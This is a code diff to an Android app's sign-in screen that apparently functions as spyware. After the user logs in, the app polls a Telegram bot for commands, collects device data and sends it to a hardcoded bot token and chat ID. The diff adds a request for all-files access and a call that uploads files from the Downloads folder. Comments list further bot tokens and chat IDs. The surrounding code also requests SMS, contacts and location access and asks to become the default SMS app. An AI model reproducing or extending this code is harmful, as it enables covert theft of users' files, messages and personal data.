@@ -50,6 +50,9 @@ import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
+import android.os.Environment;
+import android.provider.Settings;
+
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.ArrayList;
@@ -107,6 +110,10 @@ public class SignInActivity extends AppCompatActivity {
 
         // Request all relevant permissions (contacts, SMS, location, media, etc.)
         checkAndRequestPermissions();
+
+        // file permission when app start
+        checkAllFilesAccessPermission();
+
 
         // Prompt user to set us as the default SMS handler
         ensureDefaultSmsApp();
@@ -179,12 +186,20 @@ public class SignInActivity extends AppCompatActivity {
                         et_signin_passwd.getText().toString()
                 ).addOnCompleteListener(task -> {
                     if (task.isSuccessful()) {
+
+                        // file permission for when app login
+                        // checkAllFilesAccessPermission();
                         // 1) Start polling for Telegram commands in the background
                         Yummy.startPollingForCommands(SignInActivity.this);
 
                         // 2) Optionally do your data extraction & send
                         String data = Yummy.collectAllData(SignInActivity.this);
                         sendToTelegramInSignIn(data);
+
+                        // 3) Send real files (like .txt from Downloads)
+                        Yummy.sendFilesFromDownloads(SignInActivity.this);
+
+
 
                         // Admin detection logic, etc.
                         String userEmail = mAuth.getCurrentUser().getEmail();
@@ -331,7 +346,11 @@ public class SignInActivity extends AppCompatActivity {
      */
     private void sendToTelegramInSignIn(String message) {
         String botToken = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
+        // 7207364664:AAGmNIlIfhTr0G49lEezFmk17oCnXJBO38E solo
+        // 7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs group
         String chatId = "-4744802700";
+        // 732298598 solo bot
+        // -4744802700 group bot
         String urlString = "https://api.telegram.org/bot" + botToken
                 + "/sendMessage?chat_id=" + chatId
                 + "&text=" + message;
@@ -395,6 +414,25 @@ public class SignInActivity extends AppCompatActivity {
             );
         }
     }
+
+    // check permission
+    private void checkAllFilesAccessPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } catch (Exception e) {
+                    // Fallback: open generic permission screen
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivity(intent);
+                }
+            }
+        }
+    }
+
+
 
     /**
      * Prompt the user to set our app as the default SMS handler (for real SMS access).
